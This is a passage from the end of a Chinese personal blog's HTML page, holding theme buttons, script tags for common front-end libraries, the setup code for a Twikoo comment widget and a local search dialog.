title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://chenxi-api.vercel.app/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://chenxi-api.vercel.app/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script defer src="/live2d-widget-master/autoload.js"></script><script src="/js/lunar.js"></script><script src="/js/day.js"></script><script type="text/javascript" src="/js/FunnyTitle.js"></script><script type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><script src="/js/jquery.js"></script><script type="text/javascript" src="/js/click.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script defer data-pjax src="/js/cat.js"></script><script defer src="/js/runtime.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>